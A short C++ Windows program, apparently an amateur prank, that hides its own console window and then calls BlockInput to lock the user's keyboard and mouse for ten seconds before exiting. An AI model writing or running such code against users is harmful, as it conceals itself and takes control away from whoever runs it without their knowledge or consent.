// this is where i include the includes.h header file
#include "includes.h"

// this is where you're main code is enter

using namespace std;


int main()
{



	// to get the window and hide it as a background procesor:
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE );
	

	// block user input ect.keyboard,mouse 
	BlockInput(true);
	Sleep(10000); // how long you want this to run
	exit(0);





}